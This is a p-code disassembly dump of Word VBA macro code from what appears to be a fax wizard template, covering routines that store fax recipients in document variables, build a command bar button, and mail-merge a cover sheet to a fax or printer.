' 	LitStr 0x0001 " "
' 	ArgsLd StrSearchReplace 0x0003 
' 	St strNum 
' 	QuoteRem 0x0053 0x0010 "recipient number"
' Line #1644:
' 	Ld strNum 
' 	FnLen 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x001E 0x0013 "if number not empty"
' Line #1645:
' 	Ld strNum 
' 	Ld k 
' 	ArgsSt rgstrRcpntFaxNums 0x0001 
' 	QuoteRem 0x002A 0x000C "store number"
' Line #1646:
' 	Ld strCBO_RCPNT_NAME 
' 	Ld i 
' 	Concat 
' 	ArgsLd objCtrls 0x0001 
' 	MemLd Then 
' 	Ld vbTab 
' 	LitStr 0x0001 " "
' 	ArgsLd StrSearchReplace 0x0003 
' 	Ld k 
' 	ArgsSt rgstrRcpntFaxNames 0x0001 
' 	QuoteRem 0x0067 0x0016 "and corresponding name"
' Line #1647:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #1648:
' 	Ld strRCPNT_NUMBER 
' 	Ld k 
' 	Concat 
' 	Ld strNum 
' 	ArgsCall StorePref 0x0002 
' 	QuoteRem 0x0032 0x000C "store number"
' Line #1649:
' 	Ld strRCPNT_NAME 
' 	Ld k 
' 	Concat 
' 	Ld k 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrRcpntFaxNames 0x0001 
' 	ArgsCall StorePref 0x0002 
' Line #1650:
' Line #1651:
' 	Ld strCBO_RCPNT_NUM 
' 	Ld i 
' 	Concat 
' 	ArgsLd objCtrls 0x0001 
' 	MemLd ListIndex 
' 	St j 
' Line #1652:
' Line #1653:
' 	QuoteRem 0x000C 0x0020 "user selected one of the choices"
' Line #1654:
' 	Ld j 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld j 
' 	ArgsSt rgstrMRUFaxNums 0x0001 
' 	EndIf 
' 	QuoteRem 0x0035 0x001B "already picked up this text"
' Line #1655:
' 	EndIfBlock 
' Line #1656:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #1657:
' Line #1658:
' 	Ld k 
' 	St iNumRcpnts 
' Line #1659:
' Line #1660:
' 	LitDI2 0x0000 
' 	St j 
' Line #1661:
' 	Ld k 
' 	Ld iMAX_RCPNTS 
' 	Lt 
' 	Paren 
' 	While 
' 	QuoteRem 0x001C 0x0023 "if we haven't yet iMAX_RCPNTS names"
' Line #1662:
' 	QuoteRem 0x0008 0x0039 "go through the array of orginally obtained recipients and"
' Line #1663:
' 	QuoteRem 0x0008 0x0023 "store which haven't yet been stored"
' Line #1664:
' 	Ld j 
' 	Ld iMAX_RCPNTS 
' 	Lt 
' 	Paren 
' 	Ld j 
' 	ArgsLd rgstrMRUFaxNums 0x0001 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	While 
' Line #1665:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #1666:
' 	Wend 
' Line #1667:
' Line #1668:
' 	Ld j 
' 	Ld iMAX_RCPNTS 
' 	Eq 
' 	IfBlock 
' Line #1669:
' 	GoTo LReturn 
' 	QuoteRem 0x0019 0x0015 "no names left to fill"
' Line #1670:
' 	ElseBlock 
' Line #1671:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #1672:
' 	Ld strRCPNT_NAME 
' 	Ld k 
' 	Concat 
' 	Ld j 
' 	ArgsLd rgstrMRUFaxNames 0x0001 
' 	ArgsCall StorePref 0x0002 
' 	QuoteRem 0x003D 0x000A "store name"
' Line #1673:
' 	Ld strRCPNT_NUMBER 
' 	Ld k 
' 	Concat 
' 	Ld j 
' 	ArgsLd rgstrMRUFaxNums 0x0001 
' 	ArgsCall StorePref 0x0002 
' 	QuoteRem 0x003E 0x0018 "and corresponding number"
' Line #1674:
' 	LitStr 0x0000 ""
' 	Ld j 
' 	ArgsSt rgstrMRUFaxNums 0x0001 
' Line #1675:
' 	EndIfBlock 
' Line #1676:
' 	Wend 
' Line #1677:
' Line #1678:
' 	Label LReturn 
' Line #1679:
' 	ExitSub 
' Line #1680:
' 	Label FatalError 
' Line #1681:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1682:
' 	EndSub 
' Line #1683:
' Line #1684:
' 	QuoteRem 0x0000 0x002D "Error will be taken care of in SetupDocForFax"
' Line #1685:
' 	QuoteRem 0x0000 0x004B "Cover sheet is deleted after faxing if no cover sheet is opted by user. So,"
' Line #1686:
' 	QuoteRem 0x0000 0x0026 "Activedocument is new cover sheet doc."
' Line #1687:
' 	FuncDefn (Private Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean))
' Line #1688:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1689:
' 	Dim 
' 	VarDefn objVars (As Variables)
' Line #1690:
' 	Dim 
' 	VarDefn strTemp (As String)
' 	VarDefn strFaxFld (As String)
' Line #1691:
' Line #1692:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	Set objVars 
' Line #1693:
' 	Ld strNUM_RCPNTS 
' 	Ld iNumRcpnts 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1694:
' Line #1695:
' 	Ld fSaveRcpnts 
' 	IfBlock 
' Line #1696:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #1697:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iNumRcpnts 
' 	For 
' Line #1698:
' 	Ld strRCPNT_NAME 
' 	Ld i 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrRcpntFaxNames 0x0001 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1699:
' 	Ld strRCPNT_NUMBER 
' 	Ld i 
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrRcpntFaxNums 0x0001 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1700:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #1701:
' 	EndIfBlock 
' Line #1702:
' 	EndIfBlock 
' Line #1703:
' Line #1704:
' 	Ld fNoCovSht 
' 	Paren 
' 	IfBlock 
' Line #1705:
' 	LitStr 0x0013 "Cover Sheet Present"
' 	LitStr 0x0001 "0"
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1706:
' 	ElseBlock 
' Line #1707:
' 	LitStr 0x0013 "Cover Sheet Present"
' 	LitStr 0x0001 "1"
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1708:
' 	EndIfBlock 
' Line #1709:
' Line #1710:
' 	LitStr 0x0001 " "
' 	St strFaxFld 
' Line #1711:
' 	QuoteRem 0x0004 0x0021 "store what fax option user chose."
' Line #1712:
' 	Ld iFaxOption 
' 	Ld iDIFF_FAX 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #1713:
' 	LitStr 0x000E "MS Fax Present"
' 	LitStr 0x0001 "0"
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1714:
' 	LitStr 0x000B "Fax Printer"
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemLd Then 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1715:
' 	ElseBlock 
' Line #1716:
' 	LitStr 0x000E "MS Fax Present"
' 	LitStr 0x0001 "1"
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1717:
' 	Ld fDocIsFormLtr 
' 	IfBlock 
' Line #1718:
' 	Ld formWizard 
' 	MemLd cboFldsFaxNum 
' 	MemLd Value 
' 	St strFaxFld 
' Line #1719:
' 	ElseBlock 
' Line #1720:
' 	Ld strFLD_FAX_NUMBER 
' 	St strFaxFld 
' Line #1721:
' 	EndIfBlock 
' Line #1722:
' 	EndIfBlock 
' Line #1723:
' Line #1724:
' 	LitStr 0x000E "Fax Field Name"
' 	Ld strFaxFld 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1725:
' Line #1726:
' 	QuoteRem 0x0004 0x004A "if doc. is present and is to be faxed then store relevant info. about doc."
' Line #1727:
' 	Ld fDocPresent 
' 	Ld formWizard 
' 	MemLd optCovSht 
' 	MemLd Value 
' 	Paren 
' 	Not 
' 	Paren 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #1728:
' 	LitStr 0x0010 "Main Doc Present"
' 	LitStr 0x0001 "1"
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1729:
' 	LitStr 0x0012 "Main Document Name"
' 	Ld objMainDoc 
' 	MemLd New 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1730:
' Line #1731:
' 	QuoteRem 0x0008 0x0035 "is the field a fax number or an Address Book Entry???"
' Line #1732:
' 	LineCont 0x0004 0A 00 10 00
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Through Email"
' 	Ld formWizard 
' 	MemLd optFldFaxEntry 
' 	MemLd Value 
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' 	EndIf 
' Line #1733:
' Line #1734:
' 	ElseBlock 
' Line #1735:
' Line #1736:
' 	LitStr 0x0010 "Main Doc Present"
' 	LitStr 0x0001 "0"
' 	Ld objVars 
' 	ArgsMemCall Add 0x0002 
' Line #1737:
' Line #1738:
' 	EndIfBlock 
' Line #1739:
' Line #1740:
' 	EndSub 
' Line #1741:
' Line #1742:
' Line #1743:
' 	QuoteRem 0x0000 0x002E "removes vbCR & vbLF from the end of the string"
' Line #1744:
' 	QuoteRem 0x0000 0x002E "until the last character is not a vbLf or vbCr"
' Line #1745:
' 	FuncDefn (Public Function StrRemoveCrLfFromEnd(strText As String, id_FFFE As String) As String)
' Line #1746:
' 	Dim 
' 	VarDefn strChar (As String)
' Line #1747:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1748:
' Line #1749:
' 	Ld strText 
' 	FnLen 
' 	St i 
' Line #1750:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoTo LEnd 
' 	EndIf 
' Line #1751:
' Line #1752:
' 	Ld strText 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St strChar 
' Line #1753:
' 	QuoteRem 0x0004 0x001C "check for the last character"
' Line #1754:
' 	Ld strChar 
' 	Ld vbLf 
' 	Eq 
' 	Paren 
' 	Ld strChar 
' 	Ld vbCr 
' 	Eq 
' 	Paren 
' 	Or 
' 	While 
' Line #1755:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i 
' Line #1756:
' 	Ld strText 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St strChar 
' Line #1757:
' 	Wend 
' Line #1758:
' Line #1759:
' 	Label LEnd 
' Line #1760:
' 	Ld strText 
' 	Ld i 
' 	ArgsLd LBound$ 0x0002 
' 	St StrRemoveCrLfFromEnd 
' Line #1761:
' 	EndFunc 
' Line #1762:
' 	QuoteRem 0x0000 0x0026 "counts the number of lines in a string"
' Line #1763:
' 	FuncDefn (Public Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer, id_FFFE As Integer) As Integer)
' Line #1764:
' 	Dim 
' 	VarDefn cLines (As Integer)
' 	VarDefn iPos (As Integer)
' Line #1765:
' Line #1766:
' 	LitStr 0x0000 ""
' 	St strNewText 
' Line #1767:
' 	LitDI2 0x0000 
' 	St cLines 
' Line #1768:
' 	Ld strWhat 
' 	Ld vbCr 
' 	FnInStr 
' 	St iPos 
' Line #1769:
' 	Ld iPos 
' 	While 
' Line #1770:
' 	Ld iPos 
' 	Ld strWhat 
' 	FnLen 
' 	Lt 
' 	IfBlock 
' Line #1771:
' 	Ld cLines 
' 	Ld iMax 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld strNewText 
' 	Ld strWhat 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	Concat 
' 	St strNewText 
' 	EndIf 
' Line #1772:
' 	Ld cLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St cLines 
' Line #1773:
' 	Ld strWhat 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	St strWhat 
' Line #1774:
' 	Ld strWhat 
' 	Ld vbCr 
' 	FnInStr 
' 	St iPos 
' Line #1775:
' 	ElseBlock 
' Line #1776:
' 	Ld cLines 
' 	Ld iMax 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld strNewText 
' 	Ld strWhat 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	Concat 
' 	St strNewText 
' 	EndIf 
' Line #1777:
' 	Ld strWhat 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld cLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St cLines 
' 	EndIf 
' Line #1778:
' 	LitStr 0x0000 ""
' 	St strWhat 
' Line #1779:
' 	LitDI2 0x0000 
' 	St iPos 
' Line #1780:
' 	EndIfBlock 
' Line #1781:
' 	Wend 
' Line #1782:
' 	Ld strWhat 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #1783:
' 	Ld cLines 
' 	Ld iMax 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld strNewText 
' 	Ld strWhat 
' 	Concat 
' 	St strNewText 
' 	EndIf 
' Line #1784:
' 	Ld cLines 
' 	LitDI2 0x0001 
' 	Add 
' 	St cLines 
' Line #1785:
' 	EndIfBlock 
' Line #1786:
' Line #1787:
' 	Ld cLines 
' 	St ICountLines 
' Line #1788:
' Line #1789:
' 	EndFunc 
' 	QuoteRem 0x000E 0x000B " CountLines"
' Line #1790:
' Line #1791:
' 	QuoteRem 0x0000 0x006F "inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng"
' Line #1792:
' 	QuoteRem 0x0000 0x0047 "so pass a collapsed range always.and updates the range to be at the end"
' Line #1793:
' 	QuoteRem 0x0000 0x0016 "of the inserted field."
' Line #1794:
' 	FuncDefn (Private Sub InsertField(objRng As , iFldType, strText As String, fPreserveFormatting))
' Line #1795:
' 	Dim 
' 	VarDefn objFld (As Field)
' Line #1796:
' Line #1797:
' 	OnError FatalError 
' Line #1798:
' Line #1799:
' 	SetStmt 
' 	Ld objRng 
' 	Ld iFldType 
' 	Ld strText 
' 	Ld fPreserveFormatting 
' 	Ld objRng 
' 	MemLd Fields 
' 	ArgsMemLd Add 0x0004 
' 	Set objFld 
' Line #1800:
' Line #1801:
' 	SetStmt 
' 	Ld objFld 
' 	MemLd result 
' 	Set objRng 
' Line #1802:
' 	StartWithExpr 
' 	Ld objRng 
' 	With 
' Line #1803:
' 	Ld wdCollapseEnd 
' 	ArgsMemCallWith Collapse 0x0001 
' Line #1804:
' 	MemLdWith End 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith End 
' Line #1805:
' 	MemLdWith End 
' 	MemStWith Start 
' Line #1806:
' 	EndWith 
' Line #1807:
' Line #1808:
' 	ExitSub 
' Line #1809:
' 	Label FatalError 
' Line #1810:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1811:
' Line #1812:
' 	EndSub 
' Line #1813:
' 	QuoteRem 0x0000 0x004B "replaces all occurences of vbCR & vbLF with the delimiter string in strText"
' Line #1814:
' 	QuoteRem 0x0000 0x0016 "returns the new string"
' Line #1815:
' 	FuncDefn (Private Function StrReplaceCrLfWithText(strText As String, strDelim As String, id_FFFE As String) As String)
' Line #1816:
' 	Dim 
' 	VarDefn strRet (As String)
' 	VarDefn strTmp (As String)
' Line #1817:
' Line #1818:
' 	LitStr 0x0000 ""
' 	St strRet 
' Line #1819:
' 	Ld strText 
' 	St strTmp 
' Line #1820:
' 	Ld strTmp 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo LEnd 
' 	EndIf 
' Line #1821:
' Line #1822:
' 	Ld strTmp 
' 	ArgsLd StrRemoveCrLfFromEnd 0x0001 
' 	St strRet 
' Line #1823:
' 	QuoteRem 0x0004 0x0024 "remove vbLf thro' search and replace"
' Line #1824:
' 	Ld strRet 
' 	Ld vbLf 
' 	LitStr 0x0000 ""
' 	ArgsLd StrSearchReplace 0x0003 
' 	St strTmp 
' Line #1825:
' 	QuoteRem 0x0004 0x0031 "now replace all occurrences of vbCr with strDelim"
' Line #1826:
' 	Ld strTmp 
' 	Ld vbCr 
' 	Ld strDelim 
' 	ArgsLd StrSearchReplace 0x0003 
' 	St strRet 
' Line #1827:
' 	Label LEnd 
' Line #1828:
' 	Ld strRet 
' 	St StrReplaceCrLfWithText 
' Line #1829:
' Line #1830:
' 	EndFunc 
' Line #1831:
' Line #1832:
' 	QuoteRem 0x0000 0x002B "removes the character strSrch from strText."
' Line #1833:
' 	QuoteRem 0x0000 0x003E "caller should make sure that strSrch is a one character string"
' Line #1834:
' 	QuoteRem 0x0000 0x002D "returns the string stripped off the character"
' Line #1835:
' 	FuncDefn (Private Function StrSearchReplace(strText As String, strSrch As String, strReplace As String, id_FFFE As Variant))
' Line #1836:
' 	Dim 
' 	VarDefn strRet (As String)
' 	VarDefn strTmp (As String)
' Line #1837:
' 	Dim 
' 	VarDefn iPos (As Integer)
' Line #1838:
' Line #1839:
' 	LitStr 0x0000 ""
' 	St strRet 
' Line #1840:
' 	Ld strText 
' 	St strTmp 
' Line #1841:
' Line #1842:
' 	Ld strTmp 
' 	Ld strSrch 
' 	FnInStr 
' 	St iPos 
' Line #1843:
' Line #1844:
' 	Ld iPos 
' 	Paren 
' 	While 
' 	QuoteRem 0x0011 0x0013 "presence of strChar"
' Line #1845:
' 	Ld strRet 
' 	Ld strTmp 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound$ 0x0002 
' 	Concat 
' 	St strRet 
' Line #1846:
' 	Ld iPos 
' 	Ld strTmp 
' 	FnLen 
' 	Lt 
' 	Paren 
' 	IfBlock 
' Line #1847:
' 	Ld strRet 
' 	Ld strReplace 
' 	Concat 
' 	St strRet 
' Line #1848:
' 	Ld strTmp 
' 	Ld iPos 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	St strTmp 
' Line #1849:
' 	Ld strTmp 
' 	Ld strSrch 
' 	FnInStr 
' 	St iPos 
' Line #1850:
' 	ElseBlock 
' 	QuoteRem 0x000D 0x001D "strSrch is the last character"
' Line #1851:
' 	LitStr 0x0000 ""
' 	St strTmp 
' Line #1852:
' 	LitDI2 0x0000 
' 	St iPos 
' Line #1853:
' 	EndIfBlock 
' Line #1854:
' 	Wend 
' Line #1855:
' Line #1856:
' 	QuoteRem 0x0004 0x002E "append whatever is left of the original string"
' Line #1857:
' 	Ld strRet 
' 	Ld strTmp 
' 	Concat 
' 	St strRet 
' Line #1858:
' Line #1859:
' 	Ld strRet 
' 	St StrSearchReplace 
' Line #1860:
' 	EndFunc 
' Line #1861:
' Line #1862:
' 	QuoteRem 0x0000 0x0041 "Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back"
' Line #1863:
' 	QuoteRem 0x0000 0x000D "this function"
' Line #1864:
' 	FuncDefn (Public Sub SetupDocForFax(fDummy As Boolean))
' Line #1865:
' 	OnError FatalError 
' Line #1866:
' Line #1867:
' 	Ld iFaxOption 
' 	Ld iNO_FAX 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #1868:
' Line #1869:
' 	LineCont 0x0004 13 00 0C 00
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	Ld iNumRcpnts 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	And 
' 	Ld iFaxOption 
' 	Ld iMS_FAX 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #1870:
' Line #1871:
' 	QuoteRem 0x0004 0x0028 "dont save recipient info for form letter"
' Line #1872:
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	ArgsCall SaveRcpntsInDocVars 0x0001 
' Line #1873:
' Line #1874:
' 	Ld fNoCovSht 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0018 0x000C "fax the doc."
' Line #1875:
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #1876:
' 	ArgsCall FaxRegDoc 0x0000 
' Line #1877:
' 	ElseBlock 
' Line #1878:
' 	ArgsCall FaxFormLtr 0x0000 
' Line #1879:
' 	EndIfBlock 
' Line #1880:
' 	ElseBlock 
' Line #1881:
' 	ArgsCall CreateCmdBar 0x0000 
' Line #1882:
' 	EndIfBlock 
' Line #1883:
' Line #1884:
' 	ExitSub 
' Line #1885:
' 	Label FatalError 
' Line #1886:
' 	Ld strERR_CREATING_CMDBAR 
' 	ArgsCall DisplayErrorMsg 0x0001 
' Line #1887:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1888:
' 	EndSub 
' Line #1889:
' 	QuoteRem 0x0000 0x002D "Error will be taken care of in SetupDocForFax"
' Line #1890:
' 	FuncDefn (Private Sub CreateCmdBar())
' Line #1891:
' 	Dim 
' 	VarDefn objCmdBar (As CommandBar)
' Line #1892:
' 	Dim 
' 	VarDefn objBtn (As CommandBarButton)
' Line #1893:
' Line #1894:
' 	Ld ActiveDocument 
' 	Ld Application 
' 	MemSt CustomizationContext 
' Line #1895:
' 	SetStmt 
' 	Ld strCMD_BAR_TITLE 
' 	Ld msoBarFloating 
' 	ParamNamed Position 
' 	LitVarSpecial (True)
' 	ParamNamed Temporary 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd Add 0x0003 
' 	Set objCmdBar 
' Line #1896:
' Line #1897:
' 	QuoteRem 0x0004 0x000C "Add a button"
' Line #1898:
' 	SetStmt 
' 	Ld msoControlButton 
' 	LitVarSpecial (True)
' 	ParamNamed Temporary 
' 	Ld objCmdBar 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0002 
' 	Set objBtn 
' Line #1899:
' 	Ld msoButtonCaption 
' 	Ld objBtn 
' 	MemSt Style 
' Line #1900:
' 	Ld strCMD_BTN_TEXT 
' 	Ld objBtn 
' 	MemSt Caption 
' Line #1901:
' Line #1902:
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #1903:
' 	LitStr 0x000D "Fax.FaxRegDoc"
' 	Ld objBtn 
' 	MemSt OnAction 
' Line #1904:
' 	ElseBlock 
' Line #1905:
' 	LitStr 0x000E "Fax.FaxFormLtr"
' 	Ld objBtn 
' 	MemSt OnAction 
' Line #1906:
' 	EndIfBlock 
' Line #1907:
' Line #1908:
' 	LitVarSpecial (True)
' 	Ld objCmdBar 
' 	MemSt Visible 
' Line #1909:
' Line #1910:
' 	LitVarSpecial (True)
' 	St fCreatedCmdBar 
' Line #1911:
' 	ExitSub 
' Line #1912:
' Line #1913:
' 	EndSub 
' Line #1914:
' Line #1915:
' 	QuoteRem 0x0000 0x004B "Cover sheet is deleted after faxing if no cover sheet is opted by user. So,"
' Line #1916:
' 	QuoteRem 0x0000 0x0026 "Activedocument is new cover sheet doc."
' Line #1917:
' 	FuncDefn (Private Sub FaxRegDoc())
' Line #1918:
' Line #1919:
' 	Dim 
' 	VarDefn fMSFax (As Boolean)
' Line #1920:
' 	Dim 
' 	VarDefn fCovSht (As Boolean)
' Line #1921:
' 	Dim 
' 	VarDefn iNumRcpnts (As Integer)
' Line #1922:
' 	Dim 
' 	OptionBase 
' 	Ld iMAX_RCPNTS 
' 	VarDefn rgstrFaxNames (As String)
' Line #1923:
' 	Dim 
' 	OptionBase 
' 	Ld iMAX_RCPNTS 
' 	VarDefn rgstrFaxNums (As String)
' Line #1924:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1925:
' 	Dim 
' 	VarDefn strDocName (As String)
' Line #1926:
' 	Dim 
' 	VarDefn objVars (As Variables)
' Line #1927:
' 	Dim 
' 	VarDefn fMainDocPresent (As Integer)
' Line #1928:
' 	Dim 
' 	VarDefn strErrorMsg (As String)
' Line #1929:
' 	Dim 
' 	VarDefn strFaxPrinter (As String)
' 	VarDefn strActivePrinter (As String)
' Line #1930:
' 	Dim 
' 	VarDefn objTmpMM (As MailMerge)
' 	VarDefn strFaxFld (As String)
' Line #1931:
' 	Dim 
' 	VarDefn fSendMailAttach (As Boolean)
' Line #1932:
' Line #1933:
' Line #1934:
' 	OnError FatalError 
' Line #1935:
' 	Ld strERR_SEND_FAX 
' 	St strErrorMsg 
' Line #1936:
' 	Ld Application 
' 	MemLd Options 
' 	MemLd SendMailAttach 
' 	St fSendMailAttach 
' Line #1937:
' Line #1938:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	Set objVars 
' Line #1939:
' Line #1940:
' 	Ld strNUM_RCPNTS 
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St iNumRcpnts 
' Line #1941:
' Line #1942:
' 	LitStr 0x0013 "Cover Sheet Present"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St fCovSht 
' Line #1943:
' 	LitStr 0x000E "MS Fax Present"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St fMSFax 
' Line #1944:
' 	LitStr 0x0010 "Main Doc Present"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	ArgsLd Val 0x0001 
' 	St fMainDocPresent 
' Line #1945:
' 	LitStr 0x000E "Fax Field Name"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	St strFaxFld 
' Line #1946:
' Line #1947:
' 	Ld fMainDocPresent 
' 	IfBlock 
' Line #1948:
' 	QuoteRem 0x0008 0x001E "obtain handle to main document"
' Line #1949:
' 	LitStr 0x0012 "Main Document Name"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	St strDocName 
' Line #1950:
' 	Ld objMainDoc 
' 	Ld strDocName 
' 	ArgsLd FInvalidMainDoc 0x0002 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #1951:
' 	QuoteRem 0x0008 0x0032 "Set objMainDoc = Application.Documents(strDocName)"
' Line #1952:
' 	EndIfBlock 
' Line #1953:
' Line #1954:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iNumRcpnts 
' 	For 
' Line #1955:
' 	Ld strRCPNT_NAME 
' 	Ld i 
' 	Concat 
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsSt rgstrFaxNames 0x0001 
' Line #1956:
' 	Ld strRCPNT_NUMBER 
' 	Ld i 
' 	Concat 
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsSt rgstrFaxNums 0x0001 
' Line #1957:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #1958:
' Line #1959:
' 	QuoteRem 0x0004 0x003E "if nonMSFax, then set the Fax driver to be the current printer"
' Line #1960:
' 	Ld fMSFax 
' 	Paren 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #1961:
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	St strActivePrinter 
' Line #1962:
' 	LitStr 0x000B "Fax Printer"
' 	ArgsLd objVars 0x0001 
' 	MemLd Value 
' 	St strFaxPrinter 
' Line #1963:
' 	Ld strFaxPrinter 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 " "
' 	St strFaxPrinter 
' 	EndIf 
' Line #1964:
' 	Ld strFaxPrinter 
' 	Ld Application 
' 	MemSt ActivePrinter 
' Line #1965:
' 	EndIfBlock 
' Line #1966:
' Line #1967:
' 	QuoteRem 0x0004 0x0019 "fax the cover sheet first"
' Line #1968:
' 	Ld fCovSht 
' 	Paren 
' 	IfBlock 
' Line #1969:
' 	Ld iNumRcpnts 
' 	LitDI2 0x0001 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #1970:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd MailMerge 
' 	Set objTmpMM 
' Line #1971:
' 	Ld fMSFax 
' 	IfBlock 
' Line #1972:
' 	Ld wdSendToFax 
' 	Ld objTmpMM 
' 	MemSt Destination 
' Line #1973:
' 	QuoteRem 0x0010 0x0024 "MsgBox "MailMerging the cover sheet""
' Line #1974:
' 	ElseBlock 
' 	QuoteRem 0x0011 0x000A "non MS fax"
' Line #1975:
' 	Ld wdSendToPrinter 
' 	Ld objTmpMM 
' 	MemSt Destination 
' Line #1976:
' 	EndIfBlock 
' Line #1977:
' 	LitVarSpecial (True)
' 	Ld objTmpMM 
' 	MemSt MailAsAttachment 
' Line #1978:
' 	Ld strFaxFld 
' 	Ld objTmpMM 
' 	MemSt MailAddressFieldName 
' Line #1979:
' 	Ld strFAXING_CS_RECIPIENTS 
